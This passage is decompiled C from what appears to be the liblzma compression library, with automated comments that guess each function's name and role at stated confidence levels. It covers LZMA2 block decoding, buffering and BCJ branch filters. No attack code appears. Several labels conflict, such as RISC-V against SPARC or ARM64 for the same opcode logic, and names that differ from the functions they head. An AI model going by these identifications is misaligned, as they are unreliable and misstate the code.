  if (param_5 <= uVar3) goto LAB_00114a18;
  *(long *)(param_1 + 6) = *(long *)(param_1 + 6) + 1;
  *param_4 = uVar3 + 1;
  bVar1 = *(byte *)(param_3 + uVar3);
  uVar5 = bVar1 & 0x1f;
  if ((0x11 < uVar5 - 0xc) || ((uVar5 == 0xc && (bVar1 >> 5 != 0)))) {
LAB_00114a08:
    uVar3 = stack_check_return();
    return uVar3;
  }
  *(undefined8 *)(param_1 + 0x18) = 0;
  param_1[0x1b] = 3;
  param_1[0x16] = (1 << (bVar1 & 0x1f)) - ((uint)(bVar1 >> 5) << ((char)uVar5 - 4U & 0x1f));
  *(undefined8 *)(param_1 + 0x1c) = 0x200000000;
  lVar7 = lzma_lzma_decoder_memusage_full(param_1 + 0x16);
  *param_1 = 3;
  uVar3 = lVar7 + 0x8000;
  *(ulong *)(param_1 + 10) = uVar3;
LAB_001146c4:
  if (*(ulong *)(param_1 + 8) < uVar3) {
    uVar3 = stack_check_return();
    return uVar3;
  }
  local_78 = 0x4000000000000001;
  local_50 = 0;
  local_70 = FUN_00120480;
  local_68 = param_1 + 0x16;
  local_60 = (undefined1  [16])0x0;
  uVar5 = set_filter_and_init(param_1 + 0x32,param_2,&local_78);
  uVar3 = (ulong)uVar5;
  if (uVar5 != 0) {
code_r0x001148c9:
    if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
      return uVar3;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  param_1[2] = 0;
  *param_1 = 4;
switchD_001146b7_caseD_4:
  lVar7 = *param_7;
  uVar3 = *param_4;
  uVar5 = (**(code **)(param_1 + 0x38))
                    (*(undefined8 *)(param_1 + 0x32),param_2,param_3,param_4,param_5,param_6,param_7
                     ,param_8,param_9);
  lVar6 = *param_7 - lVar7;
  *(ulong *)(param_1 + 6) = *(long *)(param_1 + 6) + (*param_4 - uVar3);
  *(long *)(param_1 + 4) = *(long *)(param_1 + 4) + lVar6;
  if ((*(char *)((long)param_1 + 0x31) != '\x01') && (lVar6 != 0)) {
    uVar2 = lzma_crc32(param_6 + lVar7,lVar6,param_1[2]);
    param_1[2] = uVar2;
  }
  uVar3 = (ulong)uVar5;
  if (uVar5 != 1) goto code_r0x001148c9;
  *param_1 = 5;
switchD_001146b7_caseD_5:
  uVar3 = (-(ulong)(param_1[1] == 0) & 0xfffffffffffffff8) + 0x14;
  lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x10);
  if (*(ulong *)(param_1 + 0xe) < uVar3) goto LAB_00114a18;
  lVar7 = uVar3 + *(long *)(param_1 + 6);
  *(undefined8 *)(param_1 + 0xe) = 0;
  *(long *)(param_1 + 6) = lVar7;
  if ((((*(char *)((long)param_1 + 0x31) == '\0') && (param_1[2] != param_1[0x10])) ||
      (*(long *)(param_1 + 4) != *(long *)(param_1 + 0x11))) ||
     ((param_1[1] != 0 && (lVar7 != *(long *)(param_1 + 0x13))))) goto LAB_00114a08;
  if (*(char *)((long)param_1 + 0x32) == '\0') {
    uVar3 = stack_check_return();
    return uVar3;
  }
  *(undefined1 *)((long)param_1 + 0x33) = 0;
  *param_1 = 0;
  goto switchD_001146b7_caseD_0;
}



/**
 * @name  lzma_lz_decoder_code
 * @brief LZ decoder processing loop with internal buffering. Manages input-to-dictionary copying, dispatches to sub-decoder, handles buffer wraparound with memmove, and applies post-decode callback.
 * @confidence 80%
 * @classification parser
 * @address 0x00116610
 */

/* Processes streaming decode operations with input/output buffer management and callback handling
    */

ulong stream_decode_process
                (undefined8 *param_1,undefined8 param_2,undefined8 param_3,ulong *param_4,
                ulong param_5,undefined8 param_6,ulong *param_7,ulong param_8,int param_9)

{
  int iVar1;
  uint uVar2;
  ulong uVar3;
  uint uVar4;
  void *__dest;
  long in_FS_OFFSET;
  ulong local_48;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  do {
    if ((param_8 <= *param_7) || ((param_5 <= *param_4 && (param_9 == 0)))) {
      uVar3 = 0;
      goto LAB_00116770;
    }
    if ((*(int *)(param_1 + 0x12) == 0) &&
       (uVar2 = *(uint *)(param_1 + 8), *(uint *)(param_1 + 9) <= uVar2)) {
      iVar1 = *(int *)(param_1 + 6);
      uVar4 = *(uint *)((long)param_1 + 0x4c);
      __dest = (void *)param_1[5];
      if ((uint)(iVar1 - *(int *)(param_1 + 7)) <= uVar2) {
        uVar2 = uVar2 - *(int *)((long)param_1 + 0x34) & 0xfffffff0;
        memmove(__dest,(void *)((ulong)uVar2 + (long)__dest),(ulong)(uVar4 - uVar2));
        *(int *)((long)param_1 + 0x3c) = *(int *)((long)param_1 + 0x3c) + uVar2;
        iVar1 = *(int *)(param_1 + 6);
        uVar4 = *(int *)((long)param_1 + 0x4c) - uVar2;
        *(uint *)(param_1 + 8) = *(int *)(param_1 + 8) - uVar2;
        __dest = (void *)param_1[5];
        *(uint *)(param_1 + 9) = *(int *)(param_1 + 9) - uVar2;
        *(uint *)((long)param_1 + 0x4c) = uVar4;
      }
      local_48 = (ulong)uVar4;
      if ((code *)param_1[0x17] == (code *)0x0) {
        lzma_bufcpy(param_3,param_4,param_5,__dest,&local_48);
        if ((param_9 != 0) && (param_5 == *param_4)) {
          *(int *)((long)param_1 + 0x4c) = (int)local_48;
          *(undefined8 *)(local_48 + param_1[5]) = 0;
          goto LAB_001167e8;
        }
        *(int *)((long)param_1 + 0x4c) = (int)local_48;
        *(undefined8 *)(local_48 + param_1[5]) = 0;
        uVar3 = 0;
LAB_00116730:
        if (*(uint *)(param_1 + 7) < *(uint *)((long)param_1 + 0x4c)) {
          *(uint *)(param_1 + 9) = *(uint *)((long)param_1 + 0x4c) - *(uint *)(param_1 + 7);
        }
        iVar1 = *(int *)(param_1 + 10);
        if (iVar1 != 0) {
          uVar2 = *(uint *)(param_1 + 8);
          if (uVar2 < *(uint *)(param_1 + 9)) goto LAB_0011674e;
        }
      }
      else {
        uVar3 = (*(code *)param_1[0x17])
                          (param_1[0x14],param_2,param_3,param_4,param_5,__dest,&local_48,iVar1,
                           param_9);
        *(int *)((long)param_1 + 0x4c) = (int)local_48;
        *(undefined8 *)(local_48 + param_1[5]) = 0;
        if ((int)uVar3 != 1) goto LAB_00116730;
LAB_001167e8:
        iVar1 = *(int *)(param_1 + 10);
        *(int *)(param_1 + 0x12) = param_9;
        *(uint *)(param_1 + 9) = *(uint *)((long)param_1 + 0x4c);
        if ((iVar1 == 0) ||
           (uVar2 = *(uint *)(param_1 + 8), *(uint *)((long)param_1 + 0x4c) <= uVar2))
        goto LAB_00116660;
        uVar3 = 0;
LAB_0011674e:
        *(undefined4 *)(param_1 + 10) = 0;
        *(uint *)(param_1 + 8) = uVar2 - iVar1;
        (*(code *)param_1[0xc])(param_1 + 5);
        uVar3 = uVar3 & 0xffffffff;
      }
      if ((int)uVar3 != 0) goto LAB_00116770;
    }
LAB_00116660:
    uVar3 = (*(code *)param_1[1])(*param_1,param_1 + 5,param_6,param_7,param_8);
  } while ((int)uVar3 == 0);
  *(undefined4 *)(param_1 + 0x12) = 0;
LAB_00116770:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_lzma_lclppb_encode
 * @brief Encodes lc, lp, pb values into single byte: pb*45 + lp*9 + lc
 * @confidence 90%
 * @classification parser
 * @address 0x0011a820
 */

/* Encodes lc/lp/pb values into single byte */

undefined8 lzma_lzma_lclppb_encode(long param_1,char *param_2)

{
  uint uVar1;
  uint uVar2;
  undefined8 uVar3;
  
  uVar1 = *(uint *)(param_1 + 0x14);
  uVar3 = 1;
  if ((((uVar1 < 5) && (uVar2 = *(uint *)(param_1 + 0x18), uVar2 < 5)) && (uVar1 + uVar2 < 5)) &&
     (*(uint *)(param_1 + 0x1c) < 5)) {
    *param_2 = ((char)*(uint *)(param_1 + 0x1c) * '\x05' + (char)uVar2) * '\t' + (char)uVar1;
    uVar3 = 0;
  }
  return uVar3;
}



/**
 * @name  lzma_lzma_props_decode
 * @brief Decodes LZMA properties byte: extracts lc, lp, pb values from encoded byte, allocates 0x70-byte options structure.
 * @confidence 78%
 * @classification parser
 * @address 0x00120570
 */

/* Initializes delta decoder by parsing distance parameter and validating configuration, allocates
   0x70 byte structure */

undefined8
lzma_delta_decoder_init(undefined8 *param_1,undefined8 param_2,byte *param_3,long param_4)

{
  undefined4 uVar1;
  char cVar2;
  byte bVar3;
  byte bVar4;
  undefined4 *puVar5;
  uint uVar6;
  int iVar7;
  
  if (param_4 != 5) {
    return 8;
  }
  puVar5 = (undefined4 *)lzma_alloc(0x70);
  if (puVar5 == (undefined4 *)0x0) {
    return 5;
  }
  bVar4 = *param_3;
  if (bVar4 < 0xe1) {
    cVar2 = (char)((ushort)((ushort)bVar4 + ((ushort)bVar4 + (ushort)bVar4 * 2) * 0x24) >> 8);
    bVar3 = (byte)(((byte)(bVar4 - cVar2) >> 1) + cVar2) >> 5;
    puVar5[7] = (uint)bVar3;
    uVar6 = (uint)bVar4 + (uint)bVar3 * -0x2d;
    bVar4 = (byte)((uVar6 & 0xff) * 0x39 >> 8) >> 1;
    puVar5[6] = (uint)bVar4;
    iVar7 = (uVar6 & 0xff) - ((uint)bVar4 + (uint)bVar4 * 8);
    puVar5[5] = iVar7;
    if ((uint)bVar4 + iVar7 < 5) {
      uVar1 = *(undefined4 *)(param_3 + 1);
      *(undefined8 *)(puVar5 + 2) = 0;
      puVar5[4] = 0;
      *puVar5 = uVar1;
      *param_1 = puVar5;
      return 0;
    }
  }
  lzma_free(puVar5,param_2);
  return 8;
}



/**
 * @name  lzma_lzma2_decoder_decode
 * @brief Decodes LZMA2 compressed blocks through state machine: 0=type byte, 1-2=uncompressed size, 3-4=compressed size, 5=filter properties, 6=decompress, 7=copy uncompressed. Used internally by LZMA2 decoder.
 * @confidence 78%
 * @classification parser
 * @address 0x00120f30
 */

/* Decodes LZMA compressed blocks through a state machine that parses block headers (type byte,
   sizes, properties) and dispatches to decompression codecs. States: 0=read type, 1-2=read
   uncompressed size, 3-4=read compressed size, 5=read filter properties, 6=decompress, 7=copy
   uncompressed data. */

undefined8
lzma_block_decode(int *param_1,undefined8 *param_2,long param_3,ulong *param_4,ulong param_5)

{
  int *piVar1;
  byte bVar2;
  undefined1 uVar3;
  char cVar4;
  int iVar5;
  uint uVar6;
  undefined8 uVar7;
  long lVar8;
  ulong uVar9;
  long lVar10;
  ulong uVar11;
  
  uVar11 = *param_4;
  piVar1 = param_1 + 0x12;
  iVar5 = *param_1;
  do {
    if (param_5 <= uVar11) {
      if (iVar5 != 6) {
        return 0;
      }
      goto switchD_00121081_caseD_6;
    }
    switch(iVar5) {
    case 0:
      goto switchD_00121081_caseD_0;
    case 1:
      bVar2 = *(byte *)(param_3 + uVar11);
      uVar11 = uVar11 + 1;
      *param_1 = 2;
      *param_4 = uVar11;
      *(ulong *)(param_1 + 0xc) = *(long *)(param_1 + 0xc) + (ulong)bVar2 * 0x100;
      if (param_5 <= uVar11) {
        return 0;
      }
    case 2:
      bVar2 = *(byte *)(param_3 + uVar11);
      *param_1 = 3;
      *param_4 = uVar11 + 1;
      lVar10 = (ulong)bVar2 + 1 + *(long *)(param_1 + 0xc);
      *(long *)(param_1 + 0xc) = lVar10;
      (**(code **)(param_1 + 8))(*(undefined8 *)(param_1 + 2),lVar10,0);
LAB_00121155:
      uVar11 = *param_4;
      iVar5 = *param_1;
      break;
    case 3:
      bVar2 = *(byte *)(param_3 + uVar11);
      uVar11 = uVar11 + 1;
      *param_1 = 4;
      *param_4 = uVar11;
      *(ulong *)(param_1 + 0xe) = (ulong)bVar2 << 8;
      if (param_5 <= uVar11) {
        return 0;
      }
    case 4:
      bVar2 = *(byte *)(param_3 + uVar11);
      uVar11 = uVar11 + 1;
      *param_4 = uVar11;
      *(ulong *)(param_1 + 0xe) = *(long *)(param_1 + 0xe) + (ulong)bVar2 + 1;
      iVar5 = param_1[1];
      *param_1 = iVar5;
      break;
    case 5:
      uVar3 = *(undefined1 *)(param_3 + uVar11);
      *param_4 = uVar11 + 1;
      cVar4 = lzma_lzma_lclppb_decode(piVar1,uVar3);
      if (cVar4 != '\0') {
        return 9;
      }
      (**(code **)(param_1 + 6))(*(undefined8 *)(param_1 + 2),piVar1);
      *param_1 = 6;
      uVar11 = *param_4;
    case 6:
switchD_00121081_caseD_6:
      uVar7 = (**(code **)(param_1 + 4))
                        (*(undefined8 *)(param_1 + 2),param_2,param_3,param_4,param_5);
      uVar9 = *param_4;
      if (*(ulong *)(param_1 + 0xe) < uVar9 - uVar11) {
        return 9;
      }
      lVar10 = uVar11 + (*(ulong *)(param_1 + 0xe) - uVar9);
      *(long *)(param_1 + 0xe) = lVar10;
      if ((int)uVar7 != 1) {
        return uVar7;
      }
      if (lVar10 != 0) {
        return 9;
      }
      *param_1 = 0;
      uVar11 = uVar9;
joined_r0x001211b4:
      if (param_5 <= uVar11) {
        return 0;
      }
switchD_00121081_caseD_0:
      bVar2 = *(byte *)(param_3 + uVar11);
      *param_4 = uVar11 + 1;
      if (bVar2 == 0) {
        return 1;
      }
      uVar6 = (uint)bVar2;
      if ((bVar2 < 0xe0) && (bVar2 != 1)) {
        if (*(char *)((long)param_1 + 0x41) != '\0') {
          return 9;
        }
        if (0x7f < bVar2) goto LAB_0012101f;
LAB_001211fa:
        if (2 < uVar6) {
          return 9;
        }
        param_1[0] = 3;
        param_1[1] = 7;
      }
      else {
        *(undefined2 *)(param_1 + 0x10) = 0x101;
        if (uVar6 < 0x80) goto LAB_001211fa;
LAB_0012101f:
        *param_1 = 1;
        *(ulong *)(param_1 + 0xc) = (ulong)((uVar6 & 0x1f) << 0x10);
        if (uVar6 < 0xc0) {
          if ((char)param_1[0x10] != '\0') {
            return 9;
          }
          param_1[1] = 6;
          if (0x9f < uVar6) {
            (**(code **)(param_1 + 6))(*(undefined8 *)(param_1 + 2),piVar1);
          }
        }
        else {
          *(undefined1 *)(param_1 + 0x10) = 0;
          param_1[1] = 5;
        }
      }
      if (*(char *)((long)param_1 + 0x41) != '\0') {
        *(undefined1 *)((long)param_1 + 0x41) = 0;
        *(undefined1 *)((long)param_2 + 0x29) = 1;
        return 0;
      }
      goto LAB_00121155;
    case 7:
      uVar9 = uVar11 + *(ulong *)(param_1 + 0xe);
      if (param_5 - uVar11 <= *(ulong *)(param_1 + 0xe)) {
        uVar9 = param_5;
      }
      lVar8 = lzma_bufcpy(param_3,param_4,uVar9,*param_2,param_2 + 1,param_2[3]);
      lVar10 = *(long *)(param_1 + 0xe);
      cVar4 = *(char *)(param_2 + 5);
      *(long *)(param_1 + 0xe) = lVar10 - lVar8;
      if (cVar4 == '\0') {
        param_2[2] = param_2[1] - 0x240;
      }
      if (lVar10 - lVar8 != 0) {
        return 0;
      }
      uVar11 = *param_4;
      *param_1 = 0;
      goto joined_r0x001211b4;
    default:
      return 0xb;
    }
  } while( true );
}



/**
 * @name  lzma_simple_props_encode
 * @brief Encodes simple filter properties: validates then writes start_offset-1
 * @confidence 80%
 * @classification parser
 * @address 0x00121620
 */

/* Encodes simple filter properties, extracting offset value from opts+4 */

undefined8 lzma_simple_props_encode(long param_1,char *param_2)

{
  long lVar1;
  
  lVar1 = lzma_simple_props_validate();
  if (lVar1 != -1) {
    *param_2 = (char)*(undefined4 *)(param_1 + 4) - 1;
    return 0;
  }
  return 0xb;
}



/**
 * @name  lzma_simple_props_decode
 * @brief Decodes single byte simple filter properties, allocates 0x28-byte options struct
 * @confidence 80%
 * @classification parser
 * @address 0x00121710
 */

/* Creates simple filter properties from encoded byte, allocates 0x28 bytes */

undefined8
lzma_simple_props_create(undefined8 *param_1,undefined8 param_2,byte *param_3,long param_4)

{
  undefined4 *puVar1;
  undefined8 uVar2;
  
  if (param_4 != 1) {
    return 8;
  }
  puVar1 = (undefined4 *)lzma_alloc(0x28);
  if (puVar1 == (undefined4 *)0x0) {
    uVar2 = 5;
  }
  else {
    *puVar1 = 0;
    puVar1[1] = *param_3 + 1;
    *param_1 = puVar1;
    uVar2 = 0;
  }
  return uVar2;
}



/**
 * @name  lzma_simple_coder_decode_with_buffering
 * @brief Decodes LZMA stream with internal output buffering for post-processing (integrity check). Manages partial reads from internal buffer, dispatches to decode process, applies post-processing callback on output.
 * @confidence 72%
 * @classification parser
 * @address 0x00121850
 */

/* Decodes LZMA stream data with internal output buffering. Handles cases where output must be
   filtered/verified (e.g., integrity check) before being delivered to the caller. Manages partial
   reads from internal buffer, dispatches to lzma_decode_process, and applies a post-processing
   callback (likely integrity check) on decoded output. */

ulong stream_decode_with_buffering
                (long param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                undefined8 param_5,long param_6,long *param_7,long param_8,int param_9)

{
  long lVar1;
  long lVar2;
  ulong uVar3;
  undefined8 uVar4;
  long lVar5;
  void *__dest;
  size_t sVar6;
  long lVar7;
  
  if (param_9 == 1) {
    return 8;
  }
  uVar3 = *(ulong *)(param_1 + 0x78);
  if (uVar3 < *(ulong *)(param_1 + 0x80)) {
    lzma_bufcpy(param_1 + 0x90,param_1 + 0x78,*(ulong *)(param_1 + 0x80),param_6,param_7,param_8);
    uVar3 = *(ulong *)(param_1 + 0x78);
    if (uVar3 < *(ulong *)(param_1 + 0x80)) {
      return 0;
    }
    if (*(char *)(param_1 + 0x50) != '\0') {
      return 1;
    }
  }
  *(undefined8 *)(param_1 + 0x80) = 0;
  lVar1 = *param_7;
  sVar6 = *(long *)(param_1 + 0x88) - uVar3;
  if (sVar6 < (ulong)(param_8 - lVar1)) {
    if (sVar6 != 0) {
      memcpy((void *)(param_6 + lVar1),(void *)(param_1 + 0x90 + uVar3),sVar6);
    }
LAB_001219ca:
    *param_7 = sVar6 + lVar1;
    uVar3 = lzma_decode_process(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
                                param_9);
    if ((int)uVar3 != 0) {
      return uVar3;
    }
    lVar2 = *param_7;
    lVar7 = lVar2 - lVar1;
    if (lVar7 == 0) {
      *(undefined8 *)(param_1 + 0x78) = 0;
      *(undefined8 *)(param_1 + 0x88) = 0;
      if (*(char *)(param_1 + 0x50) == '\0') {
        return 0;
      }
    }
    else {
      lVar5 = (**(code **)(param_1 + 0x58))
                        (*(undefined8 *)(param_1 + 0x60),*(undefined4 *)(param_1 + 0x68),
                         *(undefined1 *)(param_1 + 0x51),param_6 + lVar1);
      *(int *)(param_1 + 0x68) = *(int *)(param_1 + 0x68) + (int)lVar5;
      *(undefined8 *)(param_1 + 0x78) = 0;
      sVar6 = lVar7 - lVar5;
      *(size_t *)(param_1 + 0x88) = sVar6;
      if (*(char *)(param_1 + 0x50) == '\0') {
        if (sVar6 == 0) {
          return 0;
        }
        lVar5 = ((lVar1 + *param_7) - lVar2) + lVar5;
        *param_7 = lVar5;
        __dest = memcpy((void *)(param_1 + 0x90),(void *)(lVar5 + param_6),sVar6);
        goto LAB_001218da;
      }
    }
    *(undefined8 *)(param_1 + 0x88) = 0;
  }
  else {
    if (sVar6 == 0) goto LAB_001219ca;
    __dest = (void *)(param_1 + 0x90);
    if (uVar3 != 0) {
      __dest = memmove(__dest,(void *)(uVar3 + (long)__dest),sVar6);
      *(undefined8 *)(param_1 + 0x78) = 0;
      *(size_t *)(param_1 + 0x88) = sVar6;
    }
LAB_001218da:
    uVar3 = lzma_decode_process(param_1,param_2,param_3,param_4,param_5,__dest,param_1 + 0x88,
                                *(undefined8 *)(param_1 + 0x70),param_9);
    if ((int)uVar3 != 0) {
      return uVar3;
    }
    uVar4 = (**(code **)(param_1 + 0x58))
                      (*(undefined8 *)(param_1 + 0x60),*(undefined4 *)(param_1 + 0x68),
                       *(undefined1 *)(param_1 + 0x51),__dest,*(undefined8 *)(param_1 + 0x88));
    *(int *)(param_1 + 0x68) = *(int *)(param_1 + 0x68) + (int)uVar4;
    *(undefined8 *)(param_1 + 0x80) = uVar4;
    if (*(char *)(param_1 + 0x50) != '\0') {
      uVar4 = *(undefined8 *)(param_1 + 0x88);
      *(undefined8 *)(param_1 + 0x80) = uVar4;
    }
    lzma_bufcpy(__dest,param_1 + 0x78,uVar4,param_6,param_7,param_8);
    if (*(char *)(param_1 + 0x50) == '\0') {
      return 0;
    }
  }
  return (ulong)(*(long *)(param_1 + 0x78) == *(long *)(param_1 + 0x88));
}



/**
 * @name  lzma_delta_props_decode
 * @brief Copies delta filter property value if source is valid
 * @confidence 75%
 * @classification parser
 * @address 0x00121d20
 */

/* Conditionally copies int value if source is non-null and non-zero */

undefined8 lzma_delta_props_decode(int *param_1,int *param_2)

{
  if ((param_1 != (int *)0x0) && (*param_1 != 0)) {
    *param_2 = *param_1;
    return 0;
  }
  return 0;
}



/**
 * @name  bcj_riscv_filter
 * @brief BCJ filter for RISC-V architecture that converts between relative and absolute branch/call addresses. Processes instruction pairs with specific opcode patterns (0xEF for AUIPC-like, 0x17 for branch-like) for improved compression.
 * @confidence 55%
 * @classification parser
 * @address 0x001228f0
 */

/* BCJ-like filter for SPARC architecture that detects specific instruction patterns (branch and
   call instructions identified by opcodes 0xEF and 0x17) and converts their relative addresses to
   absolute or vice versa for improved compression. */

void convert_sparc_branch_instructions
               (undefined8 param_1,int param_2,undefined8 param_3,long param_4,ulong param_5)

{
  ulong uVar1;
  uint *puVar2;
  byte *pbVar3;
  byte *pbVar4;
  uint *puVar5;
  byte bVar6;
  byte bVar7;
  byte bVar8;
  uint uVar9;
  ulong uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  uint uVar14;
  int iVar15;
  
  uVar10 = 0;
  if (param_5 < 8) {
    return;
  }
  do {
    puVar2 = (uint *)(param_4 + uVar10);
    uVar1 = uVar10 + 2;
    bVar6 = (byte)*puVar2;
    if (bVar6 == 0xef) {
      pbVar3 = (byte *)(param_4 + 1 + uVar10);
      bVar6 = *pbVar3;
      if ((bVar6 & 0xd) == 0) {
        pbVar4 = (byte *)(param_4 + 3 + uVar10);
        bVar7 = *(byte *)(uVar1 + param_4);
        bVar8 = *pbVar4;
        uVar11 = ((bVar6 & 0xf0) << 8 | (bVar7 & 0xf) << 0x10 | (bVar7 & 0x10) << 7 |
                  bVar7 >> 4 & 0xe | (bVar8 & 0x7f) << 4 | (bVar8 & 0x80) << 0xd) +
                 param_2 + (int)uVar10;
        *pbVar3 = bVar6 & 0xf | (byte)(uVar11 >> 0xd) & 0xf0;
        *(byte *)(uVar1 + param_4) = (byte)(uVar11 >> 9);
        *pbVar4 = (byte)(uVar11 >> 1);
        uVar1 = uVar10 + 4;
      }
    }
    else if ((bVar6 & 0x7f) == 0x17) {
      uVar11 = (uint)*(byte *)(param_4 + 1 + uVar10) << 8;
      uVar13 = (uint)*(byte *)(param_4 + uVar1) << 0x10;
      uVar12 = uVar11 | uVar13 | (uint)bVar6;
      uVar14 = (uint)*(byte *)(param_4 + 3 + uVar10) << 0x18;
      if ((uVar12 & 0xe80) == 0) {
        if (((uVar14 | uVar12) - 0x3117) * 0x40000 < (uVar14 >> 0x1b & 0x1d)) {
          puVar5 = (uint *)(param_4 + 4 + uVar10);
          uVar11 = *puVar5;
          *puVar2 = (uVar14 >> 0x1b) << 7 | uVar11 & 0xfffff000 | 0x17;
          *puVar5 = (uVar14 | uVar12) >> 0xc | uVar11 << 0x14;
          goto LAB_00122a7d;
        }
        uVar1 = uVar10 + 4;
      }
      else {
        puVar5 = (uint *)(param_4 + 4 + uVar10);
        uVar9 = *puVar5;
        if (((uVar12 << 8 ^ uVar9 - 3) & 0xf8003) == 0) {
          *puVar2 = uVar9 << 0xc | 0x117;
          iVar15 = param_2 + (int)uVar10 + (uVar9 >> 0x14);
          uVar11 = (iVar15 - (uVar9 >> 0x13 & 0x1000)) + (uVar14 | uVar11 & 0xfffff000 | uVar13);
          *puVar5 = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                    iVar15 * 0x1000000;
LAB_00122a7d:
          uVar1 = uVar10 + 8;
        }
        else {
          uVar1 = uVar10 + 6;
        }
      }
    }
    uVar10 = uVar1;
    if (param_5 - 8 < uVar10) {
      return;
    }
  } while( true );
}



/**
 * @name  bcj_arm64_decode_filter
 * @brief ARM64 BCJ decode filter - inverse of bcj_arm64_filter. Converts absolute addresses back to relative for ADRP+ADD and BL instruction pairs during decompression.
 * @confidence 70%
 * @classification parser
 * @address 0x00122af0
 */

/* ARM64 (AArch64) BCJ (Branch/Call/Jump) filter for instruction address conversion. Processes
   4-byte aligned instructions, handling BL instructions (opcode 0x17 family with relative 26-bit
   offset) and ADRP+ADD instruction pairs (opcode 0xEF pattern for PC-relative addressing). Converts
   between absolute and relative addresses based on current position. */

void bcj_arm64_filter(undefined8 param_1,int param_2,undefined8 param_3,long param_4,ulong param_5)

{
  ulong uVar1;
  byte *pbVar2;
  byte *pbVar3;
  byte bVar4;
  uint uVar5;
  ulong uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  int iVar11;
  uint *puVar12;
  
  uVar6 = 0;
  if (param_5 < 8) {
    return;
  }
  do {
    uVar1 = uVar6 + 2;
    bVar4 = (byte)*(uint *)(param_4 + uVar6);
    if (bVar4 == 0xef) {
      pbVar2 = (byte *)(param_4 + 1 + uVar6);
      bVar4 = *pbVar2;
      if ((bVar4 & 0xd) == 0) {
        pbVar3 = (byte *)(param_4 + 3 + uVar6);
        uVar7 = ((uint)*(byte *)(uVar1 + param_4) << 9 | (uint)*pbVar3 * 2 | (bVar4 & 0xf0) << 0xd)
                - (param_2 + (int)uVar6);
        *pbVar2 = bVar4 & 0xf | (byte)(uVar7 >> 8) & 0xf0;
        *(byte *)(uVar1 + param_4) =
             (byte)(uVar7 >> 0x10) & 0xf | (byte)(uVar7 >> 7) & 0x10 |
             (byte)((uVar7 & 0xffffffe) << 4);
        *pbVar3 = (byte)(uVar7 >> 0xd) & 0x80 | (byte)(uVar7 >> 4) & 0x7f;
        uVar1 = uVar6 + 4;
      }
    }
    else if ((bVar4 & 0x7f) == 0x17) {
      uVar7 = (uint)*(byte *)(param_4 + 1 + uVar6) << 8;
      uVar9 = (uint)*(byte *)(param_4 + uVar1) << 0x10;
      uVar8 = uVar7 | uVar9 | (uint)bVar4;
      uVar10 = (uint)*(byte *)(param_4 + 3 + uVar6) << 0x18;
      if ((uVar8 & 0xe80) == 0) {
        if (((uVar10 | uVar8) - 0x3117) * 0x40000 < (uVar10 >> 0x1b & 0x1d)) {
          puVar12 = (uint *)(param_4 + 4 + uVar6);
          uVar7 = *puVar12;
          iVar11 = (uVar7 >> 0x18 | (uVar7 & 0xff0000) >> 8 | (uVar7 & 0xff00) << 8 | uVar7 << 0x18)
                   - (param_2 + (int)uVar6);
          uVar7 = (uVar10 | uVar8) >> 0xc | iVar11 * 0x100000;
          uVar8 = iVar11 + 0x800U & 0xfffff000 | (uVar10 >> 0x1b) << 7 | 0x17;
          goto LAB_00122c8b;
        }
        uVar1 = uVar6 + 4;
      }
      else {
        puVar12 = (uint *)(param_4 + 4 + uVar6);
        uVar5 = *puVar12;
        if (((uVar8 << 8 ^ uVar5 - 3) & 0xf8003) == 0) {
          uVar8 = uVar5 << 0xc | 0x117;
          uVar7 = (uVar10 | uVar7 & 0xfffff000 | uVar9) + (uVar5 >> 0x14);
LAB_00122c8b:
          *(uint *)(param_4 + uVar6) = uVar8;
          *puVar12 = uVar7;
          uVar1 = uVar6 + 8;
        }
        else {
          uVar1 = uVar6 + 6;
        }
      }
    }
    uVar6 = uVar1;
    if (param_5 - 8 < uVar6) {
      return;
    }
  } while( true );
}



/* ==================== Utilities ==================== */

/**
 * @name  lzma_physmem
 * @brief Returns physical memory size via sysconf(_SC_PAGESIZE) * sysconf(_SC_PHYS_PAGES)
 * @confidence 95%
 * @classification utility
 * @address 0x00104ff0
 */

/* Returns physical memory size via sysconf(_SC_PAGESIZE) * sysconf(_SC_PHYS_PAGES) */

long lzma_physmem(void)

{
  long lVar1;
  long lVar2;
  
  lVar1 = sysconf(0x1e);
  lVar2 = sysconf(0x55);
  if ((lVar1 != -1) && (lVar2 != -1)) {
    return lVar2 * lVar1;
  }
  return 0;
}



/**
 * @name  lzma_cputhreads
 * @brief Returns number of available CPU threads via sched_getaffinity
 * @confidence 95%
 * @classification utility
 * @address 0x00105030
 */

/* Returns available CPU count via sched_getaffinity */

int lzma_cputhreads(void)

{
  int iVar1;
  int iVar2;
  long in_FS_OFFSET;
  cpu_set_t cStack_98;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = sched_getaffinity(0,0x80,&cStack_98);
  iVar2 = 0;
  if (iVar1 == 0) {
    iVar2 = __sched_cpucount(0x80,&cStack_98);
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_memusage
 * @brief Queries current memory usage of an LZMA stream by calling the memconfig function pointer.
 * @confidence 92%
 * @classification utility
 * @address 0x00105790
 */

/* Queries memory usage of LZMA stream */

undefined8 lzma_memusage(long param_1)

{
  undefined8 *puVar1;
  int iVar2;
  long in_FS_OFFSET;
  undefined8 local_20;
  undefined1 local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if ((((param_1 == 0) || (puVar1 = *(undefined8 **)(param_1 + 0x38), puVar1 == (undefined8 *)0x0))
      || ((code *)puVar1[7] == (code *)0x0)) ||
     (iVar2 = (*(code *)puVar1[7])(*puVar1,&local_20,local_18,0), iVar2 != 0)) {
    local_20 = 0;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
